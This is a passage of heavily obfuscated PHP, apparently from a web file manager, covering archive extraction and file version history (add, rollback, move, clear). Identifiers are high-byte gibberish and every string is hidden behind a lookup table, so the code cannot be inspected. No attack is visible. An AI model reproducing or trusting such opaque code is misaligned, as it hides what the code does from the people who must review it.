Hook::trigger($≥¬Ïµõ¡[1293], $Æ∫´Ä∆ª); recursion_dir($Æ∫´Ä∆ª, $∆Æ¥∏∞‚, $§‡ﬂö«†, 0); $íëº»ÓÖ = array_merge($∆Æ¥∏∞‚, $§‡ﬂö«†); $ÿ’ÆÇíÀ = array(); foreach ($íëº»ÓÖ as $ïƒı…‰·) { $Ù∆¢ÅøÕ = IO::move(self::iconvApp($ïƒı…‰·), $π–ÀìÑì, $¯ê–ª˝˛); if ($Ù∆¢ÅøÕ) { $ÿ’ÆÇíÀ[] = $Ù∆¢ÅøÕ; } } del_dir($Æ∫´Ä∆ª); } else { $Ù∆¢ÅøÕ = IO::move($Ì¨ñı®˝[$≥¬Ïµõ¡[242]], $π–ÀìÑì, $¯ê–ª˝˛, get_path_this($ÆÏ¡Åæ¸[$≥¬Ïµõ¡[32]])); if ($Ù∆¢ÅøÕ) { $ÿ’ÆÇíÀ[] = $Ù∆¢ÅøÕ; } } return $ÿ’ÆÇíÀ ? $ÿ’ÆÇíÀ : !1; } public static function unzipList($∏€˝éÿÑ) { $€»≈ÅΩ‡ =& $_SERVER[ˆë€Ï⁄∂]; $‹ì†â·≥ = isset($∏€˝éÿÑ[$€»≈ÅΩ‡[1294]]) ? $∏€˝éÿÑ[$€»≈ÅΩ‡[1294]] : !1; $Ä∑í‡ ∑ = isset($∏€˝éÿÑ[$€»≈ÅΩ‡[1290]]) ? @json_decode($∏€˝éÿÑ[$€»≈ÅΩ‡[1290]], !0) : -1; $ÿŸª◊”π = self::unzipPart($∏€˝éÿÑ[$€»≈ÅΩ‡[97]], $Ä∑í‡ ∑); if (!$ÿŸª◊”π || !IO::exist($ÿŸª◊”π[$€»≈ÅΩ‡[242]])) { show_json(LNG($€»≈ÅΩ‡[118]), !1); } $˙œﬂ…·ƒ = $ÿŸª◊”π[$€»≈ÅΩ‡[1289]][count($ÿŸª◊”π[$€»≈ÅΩ‡[1289]]) - 1]; $◊¨∑öêÂ = in_array(IO::ext($ÿŸª◊”π[$€»≈ÅΩ‡[242]]), array($€»≈ÅΩ‡[399], $€»≈ÅΩ‡[1295], $€»≈ÅΩ‡[1296], $€»≈ÅΩ‡[1297], $€»≈ÅΩ‡[1298], $€»≈ÅΩ‡[1299])); if (!$‹ì†â·≥ && ($˙œﬂ…·ƒ[$€»≈ÅΩ‡[1290]] == -1 || $◊¨∑öêÂ)) { $áéêñÈî = $ÿŸª◊”π[$€»≈ÅΩ‡[1291]] . get_path_this($ÿŸª◊”π[$€»≈ÅΩ‡[242]]) . $€»≈ÅΩ‡[1300]; if (!IO::exist($áéêñÈî)) { $˙ﬁÃÍÈ’ = $˙œﬂ…·ƒ[$€»≈ÅΩ‡[1290]] == -1 ? get_path_ext(IO::pathThis($∏€˝éÿÑ[$€»≈ÅΩ‡[97]])) : get_path_ext($ÿŸª◊”π[$€»≈ÅΩ‡[242]]); $âô˚ò≥⁄ = KodArchive::listContent(self::iconvSystem($ÿŸª◊”π[$€»≈ÅΩ‡[242]]), !0, $˙ﬁÃÍÈ’); self::unzipErrorCheck($âô˚ò≥⁄, array($€»≈ÅΩ‡[1301], $∏€˝éÿÑ, $ÿŸª◊”π)); @file_put_contents($áéêñÈî, json_encode($âô˚ò≥⁄[$€»≈ÅΩ‡[1302]])); } return @json_decode(IO::getContent($áéêñÈî), !0); } IO::fileOut($ÿŸª◊”π[$€»≈ÅΩ‡[242]], $‹ì†â·≥, get_path_this($˙œﬂ…·ƒ[$€»≈ÅΩ‡[32]])); die; } private static function zipFileList($Ú™Õöø±, $˙í≤Ò‹í = false) { $¨áÅÑ∑ê =& $_SERVER[ˆë€Ï⁄∂]; $˝ñø„‘º = array(); foreach ($Ú™Õöø± as $øÍîÿ†ú) { $Êô»¨±À = $øÍîÿ†ú[$¨áÅÑ∑ê[97]]; if ($˙í≤Ò‹í) { $Êô»¨±À = self::copy($øÍîÿ†ú[$¨áÅÑ∑ê[97]], $˙í≤Ò‹í, $¨áÅÑ∑ê[910]); } else { $˛ÅÜãπˆ = self::init($øÍîÿ†ú[$¨áÅÑ∑ê[97]]); if ($˛ÅÜãπˆ->getType() == $¨áÅÑ∑ê[119]) { $Êô»¨±À = $˛ÅÜãπˆ->path; } } if ($Êô»¨±À && self::local()->exist($Êô»¨±À)) { $˝ñø„‘º[$øÍîÿ†ú[$¨áÅÑ∑ê[97]]] = $Êô»¨±À; } } if (!empty($˝ñø„‘º)) { return array_values($˝ñø„‘º); } show_json(LNG($¨áÅÑ∑ê[1261]), !1); } private static function localFilePath($î»¡¶ÉÄ) { $àø¨±—Ö =& $_SERVER[ˆë€Ï⁄∂]; $ºÌ∏Ã∞¢ = KodIO::parse($î»¡¶ÉÄ); if ($ºÌ∏Ã∞¢[$àø¨±—Ö[33]] == KodIO::KOD_SOURCE) { $¨˜⁄µç˚ = Model($àø¨±—Ö[916])->fileInfoGet(KodIO::sourceID($î»¡¶ÉÄ)); if (!$¨˜⁄µç˚[$àø¨±—Ö[97]]) { show_json($àø¨±—Ö[1303], !1); } $î»¡¶ÉÄ = $¨˜⁄µç˚[$àø¨±—Ö[97]]; } $Ò‰“‡Îå = self::init($î»¡¶ÉÄ); if ($Ò‰“‡Îå->pathParse[$àø¨±—Ö[1247]]) { $î»¡¶ÉÄ = $Ò‰“‡Îå->pathParse[$àø¨±—Ö[1247]]; $Ò‰“‡Îå = self::init($î»¡¶ÉÄ); } $ö‰„πÑ¸ = $Ò‰“‡Îå->getType(); if ($ö‰„πÑ¸ == $àø¨±—Ö[119] || $ö‰„πÑ¸ == $àø¨±—Ö[1304]) { if (!$Ò‰“‡Îå->exist($Ò‰“‡Îå->path)) { show_json(LNG($àø¨±—Ö[118]), !1); } return $Ò‰“‡Îå->path; } return !1; } public static function unzipPart($áÑúæáõ, $™ø‚ò∑¯ = -1) { $ﬂ§‡‹Ã≈ =& $_SERVER[ˆë€Ï⁄∂]; $íÛ˛±ì = IO::pathThis($áÑúæáõ); if (!$™ø‚ò∑¯ || $™ø‚ò∑¯ == -1) { $’ÆÉ—≤ä = array(array($ﬂ§‡‹Ã≈[32] => $íÛ˛±ì, $ﬂ§‡‹Ã≈[1290] => -1)); $’ÆÉ—≤ä[0][$ﬂ§‡‹Ã≈[1305]] = $’ÆÉ—≤ä[0][$ﬂ§‡‹Ã≈[32]]; } else { if (is_array($™ø‚ò∑¯)) { $’ÆÉ—≤ä = $™ø‚ò∑¯; $´œöÚÏò = count($’ÆÉ—≤ä) - 1; for ($Ëıìﬁµπ = 0; $Ëıìﬁµπ <= $´œöÚÏò; $Ëıìﬁµπ++) { $ÍÆßÎΩ® = $’ÆÉ—≤ä[$Ëıìﬁµπ]; $µ¥Ê´≠« = get_path_this($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[32]]) . (checkExtSafe($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[32]]) ? $ﬂ§‡‹Ã≈[12] : $ﬂ§‡‹Ã≈[1306]); $’ÆÉ—≤ä[$Ëıìﬁµπ][$ﬂ§‡‹Ã≈[1305]] = $ﬂ§‡‹Ã≈[1307] . intval($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[1290]]) . $ﬂ§‡‹Ã≈[473] . $µ¥Ê´≠«; if ($Ëıìﬁµπ == 0) { continue; } $’ÆÉ—≤ä[$Ëıìﬁµπ][$ﬂ§‡‹Ã≈[1305]] = $’ÆÉ—≤ä[$Ëıìﬁµπ - 1][$ﬂ§‡‹Ã≈[1305]] . $ﬂ§‡‹Ã≈[1308] . $’ÆÉ—≤ä[$Ëıìﬁµπ][$ﬂ§‡‹Ã≈[1305]]; } } } if (!is_array($’ÆÉ—≤ä) || count($’ÆÉ—≤ä) == 0) { return !1; } $ÔÚ¸ñ‡÷ = $’ÆÉ—≤ä[count($’ÆÉ—≤ä) - 1]; if (!IO::exist($áÑúæáõ)) { return !1; } $Ï≠±£„ı = TEMP_FILES . $ﬂ§‡‹Ã≈[1309] . kodIO::hashPathSafe($áÑúæáõ) . $ﬂ§‡‹Ã≈[8]; $ À¶ÅŒ÷ = $Ï≠±£„ı . $ÔÚ¸ñ‡÷[$ﬂ§‡‹Ã≈[1305]]; mk_dir($Ï≠±£„ı); file_put_contents(TEMP_FILES . $ﬂ§‡‹Ã≈[1281], $ﬂ§‡‹Ã≈[12]); if (IO::exist($ À¶ÅŒ÷)) { return array($ﬂ§‡‹Ã≈[242] => $ À¶ÅŒ÷, $ﬂ§‡‹Ã≈[1289] => $’ÆÉ—≤ä, $ﬂ§‡‹Ã≈[1291] => $Ï≠±£„ı); } $πàÁπÑ = self::localFilePath($áÑúæáõ); if (!$πàÁπÑ) { $πàÁπÑ = $Ï≠±£„ı . $ﬂ§‡‹Ã≈[1310]; if (!IO::exist($πàÁπÑ)) { self::copy($áÑúæáõ, $Ï≠±£„ı, !1, get_path_this($πàÁπÑ)); } } if (!$πàÁπÑ || !IO::exist($πàÁπÑ)) { return !1; } if ($ÔÚ¸ñ‡÷[$ﬂ§‡‹Ã≈[1290]] == -1) { return array($ﬂ§‡‹Ã≈[242] => $πàÁπÑ, $ﬂ§‡‹Ã≈[1289] => $’ÆÉ—≤ä, $ﬂ§‡‹Ã≈[1291] => $Ï≠±£„ı); } $Úô˝õ¡Ê = $πàÁπÑ; foreach ($’ÆÉ—≤ä as $Ëıìﬁµπ => $ÍÆßÎΩ®) { if (!$ÍÆßÎΩ® || $ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[1290]] == $ﬂ§‡‹Ã≈[1288]) { break; } if (substr($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[32]], -1, 1) == $ﬂ§‡‹Ã≈[8]) { break; } $†ò§«ë™ = in_array(get_path_ext($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[1305]]), array($ﬂ§‡‹Ã≈[399], $ﬂ§‡‹Ã≈[1295], $ﬂ§‡‹Ã≈[1296], $ﬂ§‡‹Ã≈[1297], $ﬂ§‡‹Ã≈[1298], $ﬂ§‡‹Ã≈[1299])); $ñˆ¥úΩ¢ = $Ëıìﬁµπ == count($’ÆÉ—≤ä) - 1 && $†ò§«ë™; $◊√åËÓê = $Ï≠±£„ı . $ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[1305]]; $°Õ±–œ◊ = $Ï≠±£„ı . get_path_this($ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[32]]); if (IO::exist($◊√åËÓê)) { $Úô˝õ¡Ê = $◊√åËÓê; continue; } $≈¢¶æÑﬁ = $Ëıìﬁµπ == 0 ? get_path_ext($íÛ˛±ì) : get_path_ext($Úô˝õ¡Ê); $ì„èÂî‡ = KodArchive::extract(self::iconvSystem($Úô˝õ¡Ê), $Ï≠±£„ı, $ÍÆßÎΩ®[$ﬂ§‡‹Ã≈[1290]], $Õê˜úÏ¢, $≈¢¶æÑﬁ); self::unzipErrorCheck($ì„èÂî‡, array($ﬂ§‡‹Ã≈[1311], $áÑúæáõ, $’ÆÉ—≤ä, $ÍÆßÎΩ®, $◊√åËÓê)); if (IO::exist($°Õ±–œ◊)) { IO::rename($°Õ±–œ◊, get_path_this($◊√åËÓê)); } $Úô˝õ¡Ê = $◊√åËÓê; } $ À¶ÅŒ÷ = $Úô˝õ¡Ê; return array($ﬂ§‡‹Ã≈[242] => $Úô˝õ¡Ê, $ﬂ§‡‹Ã≈[1289] => $’ÆÉ—≤ä, $ﬂ§‡‹Ã≈[1291] => $Ï≠±£„ı); } private static function unzipErrorCheck($‚◊¡∆É“, $˛ıè∑¨ç = false) { $ô˛Ñ™ÒÚ =& $_SERVER[ˆë€Ï⁄∂]; if ($‚◊¡∆É“[$ô˛Ñ™ÒÚ[1312]]) { return !0; } write_log(array($ô˛Ñ™ÒÚ[1313], $‚◊¡∆É“, $˛ıè∑¨ç), $ô˛Ñ™ÒÚ[1314]); show_json($ô˛Ñ™ÒÚ[1315] . json_encode($‚◊¡∆É“[$ô˛Ñ™ÒÚ[1302]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $–˛âπ◊Ô =& $_SERVER[ˆë€Ï⁄∂]; $Ω˜íœ›® = $GLOBALS[$–˛âπ◊Ô[6]][$–˛âπ◊Ô[102]]; if ($Ω˜íœ›®[$–˛âπ◊Ô[1316]] != 1) { return; } if ($Ω˜íœ›®[$–˛âπ◊Ô[1317]] <= 0) { return; } if (isset($_REQUEST[$–˛âπ◊Ô[1318]]) && $_REQUEST[$–˛âπ◊Ô[1318]] == $–˛âπ◊Ô[101]) { return; } Hook::bind($–˛âπ◊Ô[1319], $–˛âπ◊Ô[1320]); Hook::bind($–˛âπ◊Ô[1321], $–˛âπ◊Ô[1322]); Hook::bind($–˛âπ◊Ô[1323], $–˛âπ◊Ô[1324]); Hook::bind($–˛âπ◊Ô[1325], $–˛âπ◊Ô[1326]); Hook::bind($–˛âπ◊Ô[1327], $–˛âπ◊Ô[1328]); Hook::bind($–˛âπ◊Ô[1329], $–˛âπ◊Ô[1330]); } public static function eventBeforeUpload($∞ˆ≤Ó÷æ) { if ($∞ˆ≤Ó÷æ[3] && $∞ˆ≤Ó÷æ[3] != REPEAT_REPLACE) { return; } $„ó…ù‡¶ = self::parsePath($∞ˆ≤Ó÷æ[0]); if (!$„ó…ù‡¶) { return; } self::add($„ó…ù‡¶); } public static function eventBeforeEdit($ëÖÜ±ú¶) { $ôÔË°ﬂæ = self::parsePath($ëÖÜ±ú¶[0]); if (!$ôÔË°ﬂæ) { return; } self::add($ôÔË°ﬂæ); } public static function eventBeforeCopyFile($Í’Öõ¯©, $´ùŸˆÈ≤, $îÄÇØÈã, $¶ÔÜÆ‹¨, $˙òßœ–Ö, $Ì—ÅÈ¡§) { $ÎÑÿÊä” =& $_SERVER[ˆë€Ï⁄∂]; if (isset($îÄÇØÈã->_data[$ÎÑÿÊä”[1251]]) && $îÄÇØÈã->_data[$ÎÑÿÊä”[1251]]) { return; } $ﬁõıÛ¬ú = $îÄÇØÈã->getPathOuter($¶ÔÜÆ‹¨); $≥«Ù¡˘é = self::parsePath($ﬁõıÛ¬ú); if (!$≥«Ù¡˘é) { return; } self::add($≥«Ù¡˘é); } public static function eventBeforeRename($¢™¨∑“ß) { $ë¡ÃòäÕ =& $_SERVER[ˆë€Ï⁄∂]; $ê—πıÅÈ = self::parsePath($¢™¨∑“ß[0]); if (!$ê—πıÅÈ) { return; } $ﬁÉï‘üü = self::checkInHistory($ê—πıÅÈ); if (!$ﬁÉï‘üü) { return; } if ($ﬁÉï‘üü[$ë¡ÃòäÕ[33]] == $ë¡ÃòäÕ[242]) { $Â»¨ÖéÜ = self::listData($ê—πıÅÈ); if ($Â»¨ÖéÜ && $Â»¨ÖéÜ[$ë¡ÃòäÕ[456]]) { self::moveHistory($ê—πıÅÈ, $¢™¨∑“ß[1]); } } else { IO::rename($ﬁÉï‘üü[$ë¡ÃòäÕ[97]], $¢™¨∑“ß[1]); } } public static function eventBeforeMove($ö¿∞…Üƒ) { $ï˜óáêú =& $_SERVER[ˆë€Ï⁄∂]; $Ñ¯◊Ÿïë = self::parsePath($ö¿∞…Üƒ[0]); if (!$Ñ¯◊Ÿïë) { return; } $Á≈ûÆÍà = self::parsePath($ö¿∞…Üƒ[1]); if (!$Á≈ûÆÍà) { return; } $§«À◊“Ë = $ö¿∞…Üƒ[3]; $∞ô˙éÅÁ = self::checkInHistory($Ñ¯◊Ÿïë); if (!$∞ô˙éÅÁ) { return; } $†ï–¶©Æ = self::pathHistory($Á≈ûÆÍà); if ($∞ô˙éÅÁ[$ï˜óáêú[33]] == $ï˜óáêú[242]) { $î∫∫Ó’£ = self::listData($Ñ¯◊Ÿïë); $‘¶°ªÉ† = rtrim($Á≈ûÆÍà, $ï˜óáêú[8]) . $ï˜óáêú[8] . ($§«À◊“Ë ? $§«À◊“Ë : get_path_this($Ñ¯◊Ÿïë)); $Æ˚ÉÉÙô = self::listData($‘¶°ªÉ†); if ($î∫∫Ó’£ && $î∫∫Ó’£[$ï˜óáêú[456]] && $Æ˚ÉÉÙô && $Æ˚ÉÉÙô[$ï˜óáêú[456]]) { return self::clear($Ñ¯◊Ÿïë); } if ($î∫∫Ó’£ && $î∫∫Ó’£[$ï˜óáêú[456]]) { self::moveHistory($Ñ¯◊Ÿïë, $§«À◊“Ë, $†ï–¶©Æ); } } else { IO::move($∞ô˙éÅÁ[$ï˜óáêú[97]], $†ï–¶©Æ, !1, $§«À◊“Ë); self::clearEmptyFolder(IO::pathFather($∞ô˙éÅÁ[$ï˜óáêú[97]])); } } public static function eventAfterRemove($´™ã£¿Å, $œÖ¨®°Ó) { $’úÊ«÷— =& $_SERVER[ˆë€Ï⁄∂]; if (!$œÖ¨®°Ó) { return; } $ïè¥‹Öú = self::parsePath($´™ã£¿Å[0]); if (!$ïè¥‹Öú) { return; } $»€≤¶è„ = self::checkInHistory($ïè¥‹Öú); if (!$»€≤¶è„) { return; } if ($»€≤¶è„[$’úÊ«÷—[33]] == $’úÊ«÷—[242]) { $…ﬁ›¯®Ü = self::listData($ïè¥‹Öú, !1); if ($…ﬁ›¯®Ü && $…ﬁ›¯®Ü[$’úÊ«÷—[456]]) { self::clear($ïè¥‹Öú, !1); } } else { IO::remove($»€≤¶è„[$’úÊ«÷—[97]]); self::clearEmptyFolder(IO::pathFather($»€≤¶è„[$’úÊ«÷—[97]])); } } private static function checkInHistory($†Å¿˜∫Ä) { $íÓôÜó‡ = self::pathHistory($†Å¿˜∫Ä); if (!IO::exist($íÓôÜó‡)) { $íÓôÜó‡ .= $_SERVER[ˆë€Ï⁄∂][1331]; } return IO::exist($íÓôÜó‡) ? IO::info($íÓôÜó‡) : !1; } private static function parsePath($∆ÅÖ–Èµ) { $˝˜ü¸˛ê =& $_SERVER[ˆë€Ï⁄∂]; if (!$∆ÅÖ–Èµ) { return !1; } if (isset($GLOBALS[$˝˜ü¸˛ê[1332]]) && $GLOBALS[$˝˜ü¸˛ê[1332]]) { return; } $¯ÎîÂò = KodIO::parse($∆ÅÖ–Èµ); $»∂Øˆæ¬ = $¯ÎîÂò[$˝˜ü¸˛ê[33]]; $ù•Ëë•Ω = !$»∂Øˆæ¬ || $»∂Øˆæ¬ == KodIO::KOD_IO || $»∂Øˆæ¬ == KodIO::KOD_SHARE_ITEM; if (!$ù•Ëë•Ω || !$¯ÎîÂò[$˝˜ü¸˛ê[1333]]) { return !1; } if (substr($∆ÅÖ–Èµ, 0, strlen(DATA_PATH . $˝˜ü¸˛ê[1334])) == DATA_PATH . $˝˜ü¸˛ê[1334]) { return !1; } if ($»∂Øˆæ¬ == KodIO::KOD_SHARE_ITEM) { $Ë´ÿ¶›° = IO::init($∆ÅÖ–Èµ); if ($Ë´ÿ¶›°->pathParse[$˝˜ü¸˛ê[1247]]) { return self::parsePath($Ë´ÿ¶›°->pathParse[$˝˜ü¸˛ê[1247]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ñ∆ëÀ≈∫ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $˝˜ü¸˛ê[1335]); foreach ($Ñ∆ëÀ≈∫ as $õÇú∑¿¡) { if (!$»∂Øˆæ¬ && substr($∆ÅÖ–Èµ, 0, strlen($õÇú∑¿¡)) == $õÇú∑¿¡) { return !1; } } self::log($GLOBALS[$˝˜ü¸˛ê[1242]] . $˝˜ü¸˛ê[1336] . $∆ÅÖ–Èµ); return $∆ÅÖ–Èµ; } private static function pathHistory($‰˘µÁ˚Ü) { $›—«˚∏Ï =& $_SERVER[ˆë€Ï⁄∂]; $⁄Ù‡üê© = self::$_historyBase . ltrim(KodIO::clear($‰˘µÁ˚Ü), $›—«˚∏Ï[8]); $⁄Ù‡üê© = str_replace(array($›—«˚∏Ï[1337]), array($›—«˚∏Ï[1338]), $⁄Ù‡üê©); return $⁄Ù‡üê©; } public static function log($ÖãΩã–Ï) { } public static function historyCount($ÄÚ¯ú¬™) { $Æ‡ºáıŸ =& $_SERVER[ˆë€Ï⁄∂]; $èó§·çÛ = array(); $Ù”Õ√Êƒ = array(); foreach ($ÄÚ¯ú¬™ as $¶îıÀ…) { $áÖ∏£ÉÕ = get_path_father($¶îıÀ…); if (!$Ù”Õ√Êƒ[$áÖ∏£ÉÕ]) { $Ù”Õ√Êƒ[$áÖ∏£ÉÕ] = array(); } $Ù”Õ√Êƒ[$áÖ∏£ÉÕ][] = get_path_this($¶îıÀ…); } foreach ($Ù”Õ√Êƒ as $áÖ∏£ÉÕ => $áı‡ôÒó) { $òü€í”ê = self::parsePath($áÖ∏£ÉÕ); if (!$òü€í”ê) { continue; } foreach ($áı‡ôÒó as $äúâ÷˙Ô) { $Ù´∑›ñµ = self::listData(rtrim($òü€í”ê, $Æ‡ºáıŸ[8]) . $Æ‡ºáıŸ[8] . $äúâ÷˙Ô, !1); if ($Ù´∑›ñµ && $Ù´∑›ñµ[$Æ‡ºáıŸ[456]]) { $èó§·çÛ[rtrim($áÖ∏£ÉÕ, $Æ‡ºáıŸ[8]) . $Æ‡ºáıŸ[8] . $äúâ÷˙Ô] = count($Ù´∑›ñµ[$Æ‡ºáıŸ[456]]); } } } return $èó§·çÛ; } public static function add($É‘Ø∞—ı) { $â˘¶¥àë =& $_SERVER[ˆë€Ï⁄∂]; $éûçıÄ˝ = self::listData($É‘Ø∞—ı); if (!$éûçıÄ˝) { return; } $◊˜ÒÆ∆∂ = Model($â˘¶¥àë[861])->get($â˘¶¥àë[1339]); $ÄØ Ÿ˛æ = intval($GLOBALS[$â˘¶¥àë[6]][$â˘¶¥àë[102]][$â˘¶¥àë[1317]]); $õ⁄˝◊Ïß = $◊˜ÒÆ∆∂ == $â˘¶¥àë[1340] ? min(5, $ÄØ Ÿ˛æ) : $ÄØ Ÿ˛æ; if ($ÄØ Ÿ˛æ <= 0) { return; } $˜‰«„®Ì = IO::info($É‘Ø∞—ı); $¡»÷§„´ = $éûçıÄ˝[$â˘¶¥àë[456]]; if ($˜‰«„®Ì[$â˘¶¥àë[89]] == 0) { return; } if ($˜‰«„®Ì[$â˘¶¥àë[89]] >= 1024 * 1024 * 500) { return !1; } $åΩÖ£ë√ = IO::hashSimple($É‘Ø∞—ı); if ($¡»÷§„´ && $¡»÷§„´[0][$â˘¶¥àë[686]] == $åΩÖ£ë√) { return !0; } if (array_key_exists($â˘¶¥àë[245], $˜‰«„®Ì) && !$˜‰«„®Ì[$â˘¶¥àë[245]]) { return !1; } $¢´Ì∏ë‚ = short_id(time()); $¯˝Ÿë√ƒ = array($â˘¶¥àë[486] => $¢´Ì∏ë‚, $â˘¶¥àë[686] => $åΩÖ£ë√, $â˘¶¥àë[32] => $˜‰«„®Ì[$â˘¶¥àë[32]] . $â˘¶¥àë[10] . date($â˘¶¥àë[1341]) . rand_string(1), $â˘¶¥àë[89] => $˜‰«„®Ì[$â˘¶¥àë[89]], $â˘¶¥àë[538] => USER_ID, $â˘¶¥àë[243] => time(), $â˘¶¥àë[1342] => $â˘¶¥àë[12]); IO::mkdir($éûçıÄ˝[$â˘¶¥àë[1343]]); $™ƒ‡”™˘ = IO::copy($É‘Ø∞—ı, $éûçıÄ˝[$â˘¶¥àë[1343]], !1, $¯˝Ÿë√ƒ[$â˘¶¥àë[32]]); if (!$™ƒ‡”™˘) { self::clearEmptyFolder($éûçıÄ˝[$â˘¶¥àë[1343]]); return !1; } array_unshift($¡»÷§„´, $¯˝Ÿë√ƒ); if (count($¡»÷§„´) > $õ⁄˝◊Ïß) { $º˜‰çÈ∆ = array_slice($¡»÷§„´, $õ⁄˝◊Ïß); foreach ($º˜‰çÈ∆ as $ê˚¸Û¥∂) { IO::remove($éûçıÄ˝[$â˘¶¥àë[1343]] . $ê˚¸Û¥∂[$â˘¶¥àë[32]]); } $¡»÷§„´ = array_slice($¡»÷§„´, 0, $õ⁄˝◊Ïß); } return self::saveData($éûçıÄ˝[$â˘¶¥àë[1344]], $¡»÷§„´); } public static function remove($“∞÷–∆ì, $°®„∑ÛË) { $èßÿ¸ºí =& $_SERVER[ˆë€Ï⁄∂]; $”é±Ôö„ = self::listData($“∞÷–∆ì); $ÂÌ•é˘« = array(); if (!$”é±Ôö„) { return !1; } foreach ($”é±Ôö„[$èßÿ¸ºí[456]] as $îΩâÑ¶•) { if ($îΩâÑ¶•[$èßÿ¸ºí[486]] == $°®„∑ÛË) { IO::remove($”é±Ôö„[$èßÿ¸ºí[1343]] . $îΩâÑ¶•[$èßÿ¸ºí[32]]); continue; } $ÂÌ•é˘«[] = $îΩâÑ¶•; } return self::saveData($”é±Ôö„[$èßÿ¸ºí[1344]], $ÂÌ•é˘«); } public static function clear($‹∆◊êå, $ÇÛƒÆ¢ç = true) { $•∑≈ïôÕ =& $_SERVER[ˆë€Ï⁄∂]; $‹ÚíÆóÄ = self::listData($‹∆◊êå, $ÇÛƒÆ¢ç); if (!$‹ÚíÆóÄ) { return !1; } foreach ($‹ÚíÆóÄ[$•∑≈ïôÕ[456]] as $Æä§¥∫Ω) { IO::remove($‹ÚíÆóÄ[$•∑≈ïôÕ[1343]] . $Æä§¥∫Ω[$•∑≈ïôÕ[32]]); } return self::saveData($‹ÚíÆóÄ[$•∑≈ïôÕ[1344]], array()); } public static function moveHistory($Á˜•’ë›, $……§‡áı = '', $√¶ß„µõ = '') { $…ãêÑåΩ =& $_SERVER[ˆë€Ï⁄∂]; $∞‚ïÆˆ˝ = self::listData($Á˜•’ë›, !1); if (!$∞‚ïÆˆ˝ || !$∞‚ïÆˆ˝[$…ãêÑåΩ[456]]) { return !1; } $˘¯É±…π = $…ãêÑåΩ[1331]; $……§‡áı = $……§‡áı ? $……§‡áı : get_path_this($Á˜•’ë›); $√¶ß„µõ = $√¶ß„µõ ? $√¶ß„µõ : $∞‚ïÆˆ˝[$…ãêÑåΩ[1343]]; $√û‚Ä“⁄ = substr(get_path_this($∞‚ïÆˆ˝[$…ãêÑåΩ[1344]]), 0, -strlen($˘¯É±…π)); foreach ($∞‚ïÆˆ˝[$…ãêÑåΩ[456]] as $Ïé÷ø‚ª => $ªÒÏï‚Â) { $ßπ€Ö±¬ = $……§‡áı . substr($ªÒÏï‚Â[$…ãêÑåΩ[32]], strlen($√û‚Ä“⁄)); $ˆı˚¥ùó = IO::move($∞‚ïÆˆ˝[$…ãêÑåΩ[1343]] . $ªÒÏï‚Â[$…ãêÑåΩ[32]], $√¶ß„µõ, !1, $ßπ€Ö±¬); if ($ˆı˚¥ùó) { $∞‚ïÆˆ˝[$…ãêÑåΩ[456]][$Ïé÷ø‚ª][$…ãêÑåΩ[32]] = $ßπ€Ö±¬; } } $∞‚ïÆˆ˝[$…ãêÑåΩ[1344]] = IO::move($∞‚ïÆˆ˝[$…ãêÑåΩ[1344]], $√¶ß„µõ, !1, $……§‡áı . $˘¯É±…π); self::saveData($∞‚ïÆˆ˝[$…ãêÑåΩ[1344]], $∞‚ïÆˆ˝[$…ãêÑåΩ[456]]); self::clearEmptyFolder($∞‚ïÆˆ˝[$…ãêÑåΩ[1343]]); } public static function rollback($ß¸∞µΩı, $√Èûí…œ) { $óÚ¿üå° =& $_SERVER[ˆë€Ï⁄∂]; $ƒ«¨åÁ⁄ = self::listData($ß¸∞µΩı); if (!$ƒ«¨åÁ⁄) { return; } $â˜˚«√Å = IO::info($ß¸∞µΩı); foreach ($ƒ«¨åÁ⁄[$óÚ¿üå°[456]] as $ˆæù¶Ìü => $êÂﬂ«◊Ã) { if ($êÂﬂ«◊Ã[$óÚ¿üå°[486]] == $√Èûí…œ) { self::add($ß¸∞µΩı); $◊Ù»∆±Î = $ƒ«¨åÁ⁄[$óÚ¿üå°[1343]] . $êÂﬂ«◊Ã[$óÚ¿üå°[32]]; $ÌÉÀ÷Ãû = IO::copy($◊Ù»∆±Î, IO::pathFather($ß¸∞µΩı), REPEAT_REPLACE, $â˜˚«√Å[$óÚ¿üå°[32]]); if ($ÌÉÀ÷Ãû) { self::remove($ß¸∞µΩı, $√Èûí…œ); } return $ÌÉÀ÷Ãû; } } return !1; } public static function setDetail($—≥ÑÒ¢¿, $Æ–¨·°±, $ﬁ€ö˛◊Ù) { $«ñÛô•ç =& $_SERVER[ˆë€Ï⁄∂]; $≥ÌÀ∫£õ = self::listData($—≥ÑÒ¢¿); if (!$≥ÌÀ∫£õ) { return; } foreach ($≥ÌÀ∫£õ[$«ñÛô•ç[456]] as $œÌ§ô∂å => $Ω¢ﬂ°˛›) { if ($Ω¢ﬂ°˛›[$«ñÛô•ç[486]] == $Æ–¨·°±) { $≥ÌÀ∫£õ[$«ñÛô•ç[456]][$œÌ§ô∂å][$«ñÛô•ç[1342]] = $ﬁ€ö˛◊Ù; self::saveData($≥ÌÀ∫£õ[$«ñÛô•ç[1344]], $≥ÌÀ∫£õ[$«ñÛô•ç[456]]); return !0; } } return !1; } public static function fileInfo($Ñâç…ß∆, $É∑È‹—∏) { $Æ™ê∫ˆÉ =& $_SERVER[ˆë€Ï⁄∂]; $®„ÔŸ§Õ = self::listData($Ñâç…ß∆); if (!$®„ÔŸ§Õ) { show_json(LNG($Æ™ê∫ˆÉ[118]), !1); } $•˙™óƒ’ = $Æ™ê∫ˆÉ[12]; foreach ($®„ÔŸ§Õ[$Æ™ê∫ˆÉ[456]] as $≥Á∆œ÷ª => $«…Â∏ÿª) { if ($«…Â∏ÿª[$Æ™ê∫ˆÉ[486]] != $É∑È‹—∏) { continue; } $•˙™óƒ’ = $®„ÔŸ§Õ[$Æ™ê∫ˆÉ[1343]] . $«…Â∏ÿª[$Æ™ê∫ˆÉ[32]]; break; } if (!$•˙™óƒ’) { show_json(LNG($Æ™ê∫ˆÉ[118]), !1); } return IO::info($•˙™óƒ’); } public static function fileOut($ô—ˆ’ÂŸ, $ªœ˝¯πâ, 